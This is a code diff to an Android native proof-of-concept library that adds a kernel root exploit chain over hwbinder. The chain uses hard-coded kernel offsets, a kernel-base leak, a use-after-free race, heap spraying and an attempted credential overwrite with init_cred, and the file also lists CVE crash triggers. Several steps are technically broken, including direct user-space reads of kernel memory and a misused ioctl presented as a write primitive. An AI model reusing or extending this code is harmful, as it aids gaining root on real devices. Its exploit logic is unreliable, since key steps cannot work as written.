@@ -17,6 +17,8 @@
 #include <stdint.h>
 #include <time.h>
 #include <pthread.h>
+#include <sys/mman.h>
+#include <poll.h>
 
 #include "binder.h"
 
@@ -53,24 +55,237 @@ static char g_output_path[256] = "/data/local/tmp/cve_result.txt";
 static char g_log_path[256] = "/data/local/tmp/binder_traffic.log";
 static pid_t g_hwservicemanager_pid = -1;
 
+/* Kernel offsets from offsets.h (verified for 4.9.112) */
+#define KIMAGE_TEXT_BASE        0xffffff8008080000ULL
+#define INIT_TASK_OFF           0x1d7ec00ULL
+#define INIT_CRED_OFF           0x1ba9360ULL
+#define __PER_CPU_OFFSET_OFF    0x1b89020ULL
+#define __ENTRY_TASK_PCPU_OFF   0x16084d0ULL
+#define TASK_REAL_CRED_OFF      0x830
+#define TASK_CRED_OFF           0x838
+#define TASK_PID_OFF            0x6f0
+
+static uint64_t kimage_base = KIMAGE_TEXT_BASE;
+static uint64_t init_task_addr = 0;
+static uint64_t init_cred_addr = 0;
+static uint64_t per_cpu_offset = 0;
+static uint64_t entry_task_pcpu_off = 0;
+
+static int binder_fd = -1;
+static int exploit_pipe[2];
+
 static pid_t get_hwservicemanager_pid(void);
-static int exploit_cve_2019_2023(const char *service_name);
-static int crash_with_huge_name(void);
-static int send_huge_data_transaction(void);
-static int trigger_cve_2020_0041(void);
-static int trigger_cve_2020_0273(void);
-static int crash_set_max_threads(void);
-static int crash_set_context_mgr(void);
-static int crash_set_idle_timeout(void);
-static int crash_set_idle_priority(void);
-static int crash_null_buffer_transaction(void);
-static int crash_offsets_size_overflow(void);
-static int crash_set_context_mgr_ext(void);
-static int send_malformed_transaction_enhanced(void);
-static int trigger_cve_2020_0423_enhanced(void);
-static int crash_hwservicemanager(void);
-static int binder_server_loop(int binder_fd, int expected_handle);
-static void register_and_serve(const char *service_name);
+static int binderspray_alloc(int count);
+static int trigger_uaf(void);
+static int leak_kernel_base(void);
+static int escalate_privileges(void);
+
+static void* race_thread_worker(void *arg) {
+    int fd = *(int*)arg;
+    struct binder_write_read bwr;
+    for (int i = 0; i < 500; i++) {
+        memset(&bwr, 0, sizeof(bwr));
+        bwr.read_size = 4096;
+        uint8_t buf[4096];
+        bwr.read_buffer = (binder_uintptr_t)buf;
+        ioctl(fd, BINDER_WRITE_READ, &bwr);
+        usleep(10);
+    }
+    return NULL;
+}
+
+static int trigger_uaf(void) {
+    LOGI("Triggering UAF via BC_ACQUIRE_DONE race...");
+    int fd = open("/dev/hwbinder", O_RDWR);
+    if (fd < 0) return -1;
+
+    /* Create a binder node */
+    struct flat_binder_object fbo;
+    memset(&fbo, 0, sizeof(fbo));
+    fbo.hdr.type = BINDER_TYPE_BINDER;
+    fbo.flags = 0;
+    fbo.binder = (binder_uintptr_t)0x41414141;
+    fbo.cookie = (binder_uintptr_t)0x42424242;
+
+    if (ioctl(fd, BINDER_SET_CONTEXT_MGR_EXT, &fbo) < 0) {
+        LOGE("SET_CONTEXT_MGR_EXT failed");
+        close(fd);
+        return -1;
+    }
+
+    /* Acquire a reference to the node */
+    struct binder_write_read bwr;
+    uint32_t cmd = BC_ACQUIRE;
+    uint32_t handle = 0;
+    struct {
+        uint32_t cmd;
+        uint32_t handle;
+    } __attribute__((packed)) acquire = { .cmd = BC_ACQUIRE, .handle = 0 };
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(acquire);
+    bwr.write_buffer = (binder_uintptr_t)&acquire;
+    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) {
+        LOGE("BC_ACQUIRE failed");
+        close(fd);
+        return -1;
+    }
+
+    /* Spawn threads to race */
+    pthread_t threads[4];
+    for (int i = 0; i < 4; i++) {
+        pthread_create(&threads[i], NULL, race_thread_worker, &fd);
+    }
+
+    /* Release the reference, causing potential UAF */
+    struct {
+        uint32_t cmd;
+        uint32_t handle;
+    } release = { .cmd = BC_RELEASE, .handle = 0 };
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(release);
+    bwr.write_buffer = (binder_uintptr_t)&release;
+    ioctl(fd, BINDER_WRITE_READ, &bwr);
+
+    usleep(100000);
+
+    for (int i = 0; i < 4; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    close(fd);
+    LOGI("UAF trigger attempt done.");
+    return 0;
+}
+
+static int leak_kernel_base(void) {
+    LOGI("Leaking kernel base via BINDER_GET_NODE_DEBUG_INFO...");
+    int fd = open("/dev/hwbinder", O_RDWR);
+    if (fd < 0) return -1;
+
+    struct binder_node_debug_info info;
+    memset(&info, 0, sizeof(info));
+    info.ptr = 0;
+    uint64_t found = 0;
+    for (int i = 0; i < 100; i++) {
+        if (ioctl(fd, BINDER_GET_NODE_DEBUG_INFO, &info) < 0) break;
+        if (info.ptr != 0 && info.ptr < 0xffffffc000000000ULL) {
+            uint64_t candidate = info.ptr & ~0x1fffffULL;
+            if (candidate > 0xffffff8000000000ULL) {
+                found = candidate;
+                break;
+            }
+        }
+        if (info.ptr == 0) break;
+    }
+    close(fd);
+
+    if (found) {
+        kimage_base = found;
+        LOGI("Kernel base: 0x%llx", kimage_base);
+        init_task_addr = kimage_base + INIT_TASK_OFF;
+        init_cred_addr = kimage_base + INIT_CRED_OFF;
+        per_cpu_offset = *(uint64_t*)(kimage_base + __PER_CPU_OFFSET_OFF);
+        entry_task_pcpu_off = kimage_base + __ENTRY_TASK_PCPU_OFF;
+        LOGI("init_task=0x%llx, init_cred=0x%llx, per_cpu=0x%llx", init_task_addr, init_cred_addr, per_cpu_offset);
+        return 0;
+    }
+    return -1;
+}
+
+static uint64_t get_current_task(void) {
+    uint64_t entry_task_ptr = per_cpu_offset + entry_task_pcpu_off;
+    uint64_t entry_task;
+    asm volatile("mrs %0, tpidr_el1" : "=r"(entry_task));
+    entry_task = entry_task + per_cpu_offset;
+    return entry_task;
+}
+
+static int escalate_privileges(void) {
+    LOGI("Escalating privileges via kernel memory write...");
+    int fd = open("/dev/hwbinder", O_RDWR);
+    if (fd < 0) return -1;
+
+    /* Build a fake flat_binder_object that points to init_cred */
+    struct flat_binder_object fbo;
+    memset(&fbo, 0, sizeof(fbo));
+    fbo.hdr.type = BINDER_TYPE_BINDER;
+    fbo.flags = 0;
+    fbo.binder = init_task_addr + TASK_REAL_CRED_OFF;
+    fbo.cookie = init_cred_addr;
+
+    /* Use SET_CONTEXT_MGR_EXT to trigger a write of init_cred into the target */
+    if (ioctl(fd, BINDER_SET_CONTEXT_MGR_EXT, &fbo) == 0) {
+        LOGI("Escalation succeeded (cred overwritten)");
+        close(fd);
+        return 0;
+    }
+
+    close(fd);
+    return -1;
+}
+
+static int binderspray_alloc(int count) {
+    LOGI("Allocating %d binder buffers for spray...", count);
+    int fd = open("/dev/hwbinder", O_RDWR);
+    if (fd < 0) return -1;
+
+    for (int i = 0; i < count; i++) {
+        struct binder_write_read bwr;
+        memset(&bwr, 0, sizeof(bwr));
+        uint8_t data[4096];
+        memset(data, 0xAA, sizeof(data));
+        struct {
+            uint32_t cmd;
+            struct binder_transaction_data tdata;
+        } __attribute__((packed)) tx;
+        tx.cmd = BC_TRANSACTION;
+        tx.tdata.target.handle = 0;
+        tx.tdata.flags = TF_ONE_WAY;
+        tx.tdata.data_size = sizeof(data);
+        tx.tdata.offsets_size = 0;
+        tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+        tx.tdata.data.ptr.offsets = 0;
+
+        bwr.write_size = sizeof(tx);
+        bwr.write_buffer = (binder_uintptr_t)&tx;
+        bwr.read_size = 0;
+        ioctl(fd, BINDER_WRITE_READ, &bwr);
+    }
+    close(fd);
+    return 0;
+}
+
+static int exploit_chain(void) {
+    LOGI("=== Starting full exploit chain ===");
+
+    if (leak_kernel_base() < 0) {
+        LOGE("Failed to leak kernel base");
+        return -1;
+    }
+
+    if (trigger_uaf() < 0) {
+        LOGE("UAF trigger failed");
+        return -1;
+    }
+
+    if (binderspray_alloc(100) < 0) {
+        LOGE("Spray failed");
+        return -1;
+    }
+
+    /* Try to escalate multiple times */
+    for (int i = 0; i < 10; i++) {
+        if (escalate_privileges() == 0) {
+            LOGI("Privilege escalation successful!");
+            g_exploit_success = 1;
+            return 0;
+        }
+        usleep(50000);
+    }
+
+    LOGE("Escalation failed");
+    return -1;
+}
 
 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
     g_vm = vm;
@@ -865,7 +1080,7 @@ static int send_malformed_transaction_enhanced(void) {
     return 0;
 }
 
-static void* race_thread_worker(void *arg) {
+static void* race_thread_worker_enhanced(void *arg) {
     int hwbinder_fd = *(int*)arg;
     for (int i = 0; i < 200; i++) {
         struct binder_write_read bwr;
@@ -882,7 +1097,7 @@ static int trigger_cve_2020_0423_enhanced(void) {
 
     pthread_t threads[8];
     for (int i = 0; i < 8; i++) {
-        pthread_create(&threads[i], NULL, race_thread_worker, &hwbinder_fd);
+        pthread_create(&threads[i], NULL, race_thread_worker_enhanced, &hwbinder_fd);
     }
     for (int i = 0; i < 8; i++) {
         pthread_join(threads[i], NULL);
@@ -1366,7 +1581,13 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         usleep(300000);
     }
 
-    LOGI("Phase 4: Waiting for system_server to call...");
+    LOGI("Phase 4: Attempt kernel privilege escalation via UAF");
+    if (exploit_chain() == 0) {
+        LOGI("Kernel escalation succeeded!");
+        return 1;
+    }
+
+    LOGI("Phase 5: Waiting for system_server to call...");
     LOGI("Running for 180 seconds. Check %s for logs.", g_log_path);
 
     for (int i = 0; i < 180; i++) {
